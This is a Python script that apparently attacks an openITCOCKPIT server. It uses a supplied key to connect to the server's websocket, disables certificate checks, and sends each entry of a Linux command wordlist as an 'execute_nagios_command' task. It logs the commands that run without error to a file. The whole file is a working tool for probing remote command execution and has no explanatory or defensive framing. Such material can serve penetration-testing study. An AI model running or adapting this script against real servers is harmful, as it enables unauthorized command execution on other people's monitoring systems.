import websocket
import ssl
import json
import argparse
import _thread as thread # To allow for execution of tasks in background
uniqid = ""
key = ""
wordlist = []
i = 0
success = []

def toJson(task,data):
	req = {
		"task": task,
		"data": data,
		"uniqid": uniqid,
		"key": key
	}
	return json.dumps(req)

import time
def send_command(ws):
	time.sleep(1)
	cmd = wordlist[i]
	print("Current Command: ", cmd)
	ws.send(toJson("execute_nagios_command", cmd))

def on_open(ws):
	global wordlist, i
	def run():
		while True:
			cmd = wordlist[i]
			print("Sending ", cmd)
			ws.send(toJson("execute_nagios_command", cmd))
	thread.start_new_thread(run, ())

def on_message(ws, message):
	global uniqid, i, wordlist, success
	mes = json.loads(message)
	if "uniqid" in mes.keys():
		uniqid = mes["uniqid"]
	
	if mes['type'] == 'connection':
		print("[+] Connection Open")
	elif mes['type'] == 'dispatcher':
		pass
	elif mes['type'] == 'response':
		if "ERROR" not in mes['payload']:
			success.append(wordlist[i])
		print()
		print("Resp: ", mes["payload"])
	else:
		print()
		print("Message: ", mes)

	i += 1
	if i == len(wordlist):
		with open("successful_commands.txt", "w") as f:
			f.write('\n'.join(success))
		exit(0)

def on_error(ws, error):
	global i
	print()
	print("Error: ", error)

def on_close(ws, close_status_code, close_msg):
	print()
	print("[+] Connection Closed")
	print(close_msg)

def main(args):
	global key, wordlist
	key = args.key
	url = args.url
	print(url)
	websocket.enableTrace(args.verbose)

	with open("linux-commands-builtin.txt", "r") as f:
		wordlist = f.read().split('\n')

	ws = websocket.WebSocketApp(args.url,
		on_message = on_message,
		on_error = on_error,
		on_close = on_close,
		on_open = on_open
	)
	# ws.run_forever()
	ws.run_forever(sslopt={"cert_reqs": ssl.CERT_NONE})

if __name__ == '__main__':
	parser = argparse.ArgumentParser()
	parser.add_argument('--url', '-u', required=True, dest='url', help='Websocket URL')
	parser.add_argument('--key', '-k', required=True, dest='key', help='openITCOCKPIT key')
	parser.add_argument('--verbose', '-v', help='Print more data', action='store_true')
	args = parser.parse_args()
	main(args)
